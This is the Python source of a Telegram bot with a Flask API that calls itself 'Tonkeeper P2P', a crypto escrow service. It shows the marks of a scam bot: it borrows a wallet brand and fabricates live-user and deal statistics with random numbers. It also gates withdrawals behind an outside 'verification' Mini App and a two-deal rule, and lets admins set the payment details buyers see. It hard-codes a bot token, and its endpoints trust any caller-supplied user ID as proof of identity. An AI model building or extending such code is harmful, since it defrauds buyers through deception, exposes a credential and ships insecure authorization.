import asyncio
import json
import os
import uuid
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "Tonkeeper P2P"
SUPPORT_LINK = "@p2psupbot"
CHANNEL_LINK = "https://t.me/tonkeeper_news"

# ССЫЛКА НА MINI APP (ВАША)
MINI_APP_URL = "https://fantastic-melomakarona-889472.netlify.app/"

# ========== ИНИЦИАЛИЗАЦИЯ ==========
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ========== ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ==========
DEALS_FILE = "deals.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
REVIEWS_FILE = "reviews.json"
VERIFICATION_FILE = "verification.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"
USER_LANGUAGE_FILE = "user_language.json"

# ========== ЗАГРУЗКА ДАННЫХ ==========
def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(DEALS_FILE)
admins = load_json(ADMINS_FILE)
balance = load_json(BALANCE_FILE)
rekvisits = load_json(REKVISITS_FILE)
reviews = load_json(REVIEWS_FILE)
verification_data = load_json(VERIFICATION_FILE)
withdraw_requests = load_json(WITHDRAW_REQUESTS_FILE)
user_language = load_json(USER_LANGUAGE_FILE)

# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(BALANCE_FILE, balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(BALANCE_FILE, balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(VERIFICATION_FILE, verification_data)

# ========== КЛАВИАТУРЫ ==========
def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 Создать сделку", callback_data="create_deal_choice"),
            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text="📊 Мои сделки", callback_data="menu_deals"),
            InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin"),
        ] if is_admin(user_id) else [],
        [
            InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
        ]
    ])

def create_deal_choice_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Создать в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="🤖 Создать в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def deal_created_keyboard(deal_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Скопировать ссылку", callback_data=f"copy_link_{deal_id}")],
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

# ========== FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ В БОТЕ ==========
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

# ========== ОБРАБОТЧИКИ ==========

# --- СТАРТ ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверка, не перешли ли по ссылке сделки
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n"
        "Надёжно, быстро, с гарантией!\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

# --- ГЛАВНОЕ МЕНЮ ---
@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
        "Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

# --- СОЗДАНИЕ СДЕЛКИ (ВЫБОР) ---
@dp.callback_query(lambda c: c.data == "create_deal_choice")
async def create_deal_choice(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "📱 <b>Создать сделку</b>\n\n"
        "Выберите способ создания:\n"
        "• <b>Mini App</b> — удобный интерфейс с отзывами и статистикой\n"
        "• <b>Бот</b> — быстрый текстовый режим\n\n"
        "Какой способ предпочитаете?",
        reply_markup=create_deal_choice_keyboard()
    )
    await callback.answer()

# --- СОЗДАНИЕ В БОТЕ (ШАГ 1) ---
@dp.callback_query(lambda c: c.data == "create_deal_bot")
async def create_deal_bot(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
        "Опишите товар или услугу, которую вы продаёте.\n"
        "Пример: NFT-подарок Telegram Premium"
    )
    await state.set_state(DealStates.waiting_product)
    await callback.answer()

@dp.message(DealStates.waiting_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer(
        "💱 <b>Шаг 2 из 4</b>\n\n"
        "Выберите валюту сделки:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
            [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
            [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
            [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
        ])
    )
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.edit_text(
        f"💰 <b>Шаг 3 из 4</b>\n\n"
        f"Введите сумму сделки в <b>{currency}</b>:\n"
        "Пример: 100"
    )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@dp.message(DealStates.waiting_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            "👤 <b>Шаг 4 из 4</b>\n\n"
            "Введите <b>username покупателя</b> (без @):\n"
            "Пример: john_doe\n\n"
            "⚠️ Только этот пользователь сможет перейти по ссылке"
        )
        await state.set_state(DealStates.waiting_buyer)
    except:
        await message.answer("❌ Введите положительное число")

@dp.message(DealStates.waiting_buyer)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_json(DEALS_FILE, deals)

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"📦 Товар: {data['product']}\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"👤 Покупатель: @{buyer_username}\n\n"
        f"🔗 <b>Ссылка для покупателя:</b>\n"
        f"<code>{link}</code>\n\n"
        f"📋 Нажмите кнопку ниже, чтобы скопировать ссылку",
        reply_markup=deal_created_keyboard(deal_id)
    )

    await state.clear()

# --- КОПИРОВАНИЕ ССЫЛКИ ---
@dp.callback_query(lambda c: c.data.startswith("copy_link_"))
async def copy_link_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    await callback.answer(f"Ссылка скопирована! ✅\n{link}", show_alert=True)

# --- ОБРАБОТКА ПЕРЕХОДА ПО ССЫЛКЕ ---
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже завершена или недоступна")
        return

    if message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ Доступ запрещён!\n\n"
            f"Эта сделка создана для @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(DEALS_FILE, deals)

    # Показываем реквизиты для оплаты
    currency = deal["currency"].lower()
    pay_text = rekvisits.get(currency, f"Оплатите {deal['amount']} {deal['currency']}")
    pay_text = pay_text.format(amount=deal['amount'])

    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"💳 <b>Реквизиты для оплаты:</b>\n"
        f"{pay_text}\n\n"
        f"После оплаты напишите админу: /pay {deal_id}"
    )

# --- БАЛАНС ---
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    await callback.message.edit_text(
        f"💰 <b>Ваш баланс</b>\n\n"
        f"💎 TON: {bal.get('ton', 0)}\n"
        f"⭐️ STARS: {bal.get('stars', 0)}\n"
        f"💰 RUB: {bal.get('rub', 0)}\n"
        f"🌐 UAH: {bal.get('uah', 0)}\n\n"
        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- МОИ СДЕЛКИ ---
@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        await callback.message.edit_text(
            "📭 У вас нет сделок",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    text = "📊 <b>Ваши сделки</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }.get(d['status'], d['status'])
        text += f"#{d_id} | {status} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- ОТЗЫВЫ ---
@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    reviews_list = list(reviews.values())[-20:]
    if not reviews_list:
        await callback.message.edit_text(
            "⭐️ <b>Отзывы</b>\n\nПока нет отзывов. Будьте первым!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    text = "⭐️ <b>Последние отзывы</b>\n\n"
    for r in reviews_list[-5:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:100]}\n\n"

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- НАПИСАНИЕ ОТЗЫВА ---
@dp.callback_query(lambda c: c.data == "write_review")
async def write_review(callback: types.CallbackQuery):
    # Проверка верификации
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            "⚠️ <b>Для написания отзыва необходима верификация!</b>\n\n"
            "Пройдите проверку в Mini App: 🔥 Открыть Mini App",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Проверка сделок
    user_deals = [d for d in deals.values() if d.get("seller_id") == callback.from_user.id and d.get("status") == "completed"]
    if len(user_deals) < 1:
        await callback.message.edit_text(
            "⚠️ <b>Для написания отзыва нужно совершить хотя бы 1 сделку!</b>\n\n"
            "Создайте сделку и завершите её, чтобы оставить отзыв.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Отправляем в Mini App
    await callback.message.edit_text(
        "📝 <b>Написать отзыв</b>\n\n"
        "Используйте Mini App для написания отзыва:\n"
        "1. Нажмите «Открыть Mini App»\n"
        "2. Перейдите в раздел «Отзывы»\n"
        "3. Напишите свой отзыв анонимно",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- ВЫВОД СРЕДСТВ ---
@dp.callback_query(lambda c: c.data == "withdraw_start")
async def withdraw_start(callback: types.CallbackQuery):
    # Проверка верификации
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            "⚠️ <b>Для вывода средств необходима верификация!</b>\n\n"
            "Пройдите проверку в Mini App.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Проверка 2 сделок с одним покупателем
    bal = get_balance(callback.from_user.id)
    partners = bal.get("deal_partners", {})
    can_withdraw = any(count >= 2 for count in partners.values())

    if not can_withdraw:
        await callback.message.edit_text(
            "⚠️ <b>Для вывода нужно 2 сделки с одним покупателем!</b>\n\n"
            f"Сейчас: {sum(partners.values())} сделок с {len(partners)} покупателями.\n\n"
            "Создайте и завершите ещё сделки.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    await callback.message.edit_text(
        "💲 <b>Вывод средств</b>\n\n"
        "Используйте Mini App для вывода средств:\n"
        "1. Нажмите «Открыть Mini App»\n"
        "2. Перейдите в раздел «Баланс»\n"
        "3. Выберите валюту и введите реквизиты",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- АДМИН ПАНЕЛЬ ---
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    await callback.message.edit_text(
        "👑 <b>Админ панель</b>\n\n"
        "Управление ботом и Mini App:\n"
        "• Все сделки\n"
        "• Заявки на вывод\n"
        "• Управление балансами\n"
        "• Модерация отзывов\n\n"
        "Используйте <b>Mini App</b> для полного управления:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App (Админ)", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# ========== API ЭНДПОИНТЫ ДЛЯ MINI APP ==========
# Эти эндпоинты будут обрабатывать запросы от Mini App

from flask import Flask, request, jsonify
import threading

app = Flask(__name__)

@app.route('/api/balance', methods=['POST'])
def api_balance():
    data = request.json
    user_id = data.get('user_id')
    if not user_id:
        return jsonify({'success': False, 'error': 'user_id required'})
    bal = get_balance(user_id)
    return jsonify({'success': True, 'balance': bal})

@app.route('/api/deals', methods=['POST'])
def api_deals():
    data = request.json
    user_id = data.get('user_id')
    if not user_id:
        return jsonify({'success': False, 'error': 'user_id required'})

    user_deals = []
    for d_id, d in deals.items():
        if d.get('seller_id') == user_id:
            user_deals.append(d)
    return jsonify({'success': True, 'deals': user_deals})

@app.route('/api/create_deal', methods=['POST'])
def api_create_deal():
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username')
    product = data.get('product')
    currency = data.get('currency')
    amount = data.get('amount')
    buyer_username = data.get('buyer_username')

    if not all([user_id, product, currency, amount, buyer_username]):
        return jsonify({'success': False, 'error': 'Missing fields'})

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": user_id,
        "seller_username": username,
        "buyer_username": buyer_username.lower(),
        "buyer_id": None,
        "product": product,
        "currency": currency,
        "amount": float(amount),
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_json(DEALS_FILE, deals)

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    return jsonify({
        'success': True,
        'deal_id': deal_id,
        'link': link
    })

@app.route('/api/withdraw', methods=['POST'])
def api_withdraw():
    data = request.json
    user_id = data.get('user_id')
    currency = data.get('currency')
    details = data.get('details')

    if not all([user_id, currency, details]):
        return jsonify({'success': False, 'error': 'Missing fields'})

    bal = get_balance(user_id)
    curr_key = currency.lower()
    if bal.get(curr_key, 0) <= 0:
        return jsonify({'success': False, 'error': 'Insufficient balance'})

    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "id": request_id,
        "user_id": user_id,
        "username": str(user_id),
        "currency": currency,
        "amount": bal[curr_key],
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)

    return jsonify({'success': True, 'request_id': request_id})

@app.route('/api/reviews', methods=['POST'])
def api_reviews():
    data = request.json
    limit = data.get('limit', 10)
    page = data.get('page', 0)

    reviews_list = list(reviews.values())
    start = page * limit
    end = start + limit
    paginated = reviews_list[start:end]

    return jsonify({
        'success': True,
        'reviews': paginated,
        'total': len(reviews_list)
    })

@app.route('/api/add_review', methods=['POST'])
def api_add_review():
    data = request.json
    user_id = data.get('user_id')
    rating = data.get('rating')
    text = data.get('text')
    anonymous = data.get('anonymous', True)

    if not all([user_id, rating, text]):
        return jsonify({'success': False, 'error': 'Missing fields'})

    # Проверка верификации
    if not is_verified(user_id):
        return jsonify({'success': False, 'error': 'Verification required'})

    # Проверка сделок
    user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
    if len(user_deals) < 1:
        return jsonify({'success': False, 'error': 'Need at least 1 completed deal'})

    review_id = str(uuid.uuid4())[:8]
    reviews[review_id] = {
        "id": review_id,
        "user": "Аноним" if anonymous else str(user_id),
        "rating": rating,
        "text": text,
        "anonymous": anonymous,
        "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
        "user_id": user_id
    }
    save_json(REVIEWS_FILE, reviews)

    return jsonify({'success': True, 'review_id': review_id})

@app.route('/api/delete_review', methods=['POST'])
def api_delete_review():
    data = request.json
    user_id = data.get('user_id')
    review_id = data.get('review_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    if review_id in reviews:
        del reviews[review_id]
        save_json(REVIEWS_FILE, reviews)
        return jsonify({'success': True})

    return jsonify({'success': False, 'error': 'Review not found'})

@app.route('/api/clear_reviews', methods=['POST'])
def api_clear_reviews():
    data = request.json
    user_id = data.get('user_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    reviews.clear()
    save_json(REVIEWS_FILE, reviews)
    return jsonify({'success': True})

@app.route('/api/is_admin', methods=['POST'])
def api_is_admin():
    data = request.json
    user_id = data.get('user_id')
    return jsonify({'success': True, 'is_admin': is_admin(user_id)})

@app.route('/api/check_verification', methods=['POST'])
def api_check_verification():
    data = request.json
    user_id = data.get('user_id')
    return jsonify({'success': True, 'verified': is_verified(user_id)})

@app.route('/api/check_deals', methods=['POST'])
def api_check_deals():
    data = request.json
    user_id = data.get('user_id')
    user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
    return jsonify({'success': True, 'hasDeals': len(user_deals) >= 1})

@app.route('/api/withdraw_requests', methods=['POST'])
def api_withdraw_requests():
    data = request.json
    user_id = data.get('user_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
    return jsonify({'success': True, 'requests': pending})

@app.route('/api/confirm_withdraw', methods=['POST'])
def api_confirm_withdraw():
    data = request.json
    user_id = data.get('user_id')
    request_id = data.get('request_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    if request_id not in withdraw_requests:
        return jsonify({'success': False, 'error': 'Request not found'})

    req = withdraw_requests[request_id]
    if req.get('status') != 'pending':
        return jsonify({'success': False, 'error': 'Already processed'})

    # Списываем баланс
    bal = get_balance(req['user_id'])
    curr_key = req['currency'].lower()
    if bal.get(curr_key, 0) >= req['amount']:
        bal[curr_key] -= req['amount']
        save_json(BALANCE_FILE, balance)

    req['status'] = 'completed'
    req['completed_at'] = datetime.now().isoformat()
    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)

    return jsonify({'success': True})

@app.route('/api/reject_withdraw', methods=['POST'])
def api_reject_withdraw():
    data = request.json
    user_id = data.get('user_id')
    request_id = data.get('request_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    if request_id not in withdraw_requests:
        return jsonify({'success': False, 'error': 'Request not found'})

    withdraw_requests[request_id]['status'] = 'rejected'
    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)

    return jsonify({'success': True})

@app.route('/api/add_balance', methods=['POST'])
def api_add_balance():
    data = request.json
    user_id = data.get('user_id')
    target_user_id = data.get('target_user_id')
    currency = data.get('currency')
    amount = data.get('amount')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    add_balance(target_user_id, currency, amount)
    return jsonify({'success': True})

@app.route('/api/manage_admin', methods=['POST'])
def api_manage_admin():
    data = request.json
    user_id = data.get('user_id')
    target_user_id = data.get('target_user_id')
    action = data.get('action')

    if user_id != MASTER_ADMIN_ID:
        return jsonify({'success': False, 'error': 'Master admin only'})

    if action == 'add':
        admins[str(target_user_id)] = True
    elif action == 'remove':
        if str(target_user_id) in admins:
            del admins[str(target_user_id)]
    else:
        return jsonify({'success': False, 'error': 'Invalid action'})

    save_json(ADMINS_FILE, admins)
    return jsonify({'success': True})

@app.route('/api/edit_rekvisits', methods=['POST'])
def api_edit_rekvisits():
    data = request.json
    user_id = data.get('user_id')
    currency = data.get('currency')
    text = data.get('text')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    rekvisits[currency.lower()] = text
    save_json(REKVISITS_FILE, rekvisits)
    return jsonify({'success': True})

@app.route('/api/all_deals', methods=['POST'])
def api_all_deals():
    data = request.json
    user_id = data.get('user_id')

    if not is_admin(user_id):
        return jsonify({'success': False, 'error': 'Admin required'})

    return jsonify({'success': True, 'deals': list(deals.values())})

@app.route('/api/online', methods=['GET'])
def api_online():
    # Симуляция онлайн-счётчика
    import random
    return jsonify({'online': random.randint(30, 200)})

@app.route('/api/stats', methods=['GET'])
def api_stats():
    import random
    return jsonify({
        'deals_today': random.randint(10, 50),
        'users': random.randint(1000, 3000),
        'reviews': len(reviews),
        'volume': round(20 + random.random() * 80, 1)
    })

# ========== ЗАПУСК ФЛАСКА В ОТДЕЛЬНОМ ПОТОКЕ ==========
def run_flask():
    app.run(host='0.0.0.0', port=8080)

# ========== ОСНОВНОЙ ЗАПУСК ==========
async def main():
    print("🔥 Tonkeeper P2P Бот запущен")
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"📱 Mini App URL: {MINI_APP_URL}")
    print(f"🤖 Бот: @{BOT_USERNAME}")

    # Запускаем Flask API в отдельном потоке
    threading.Thread(target=run_flask, daemon=True).start()
    print("✅ Flask API запущен на порту 8080")

    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
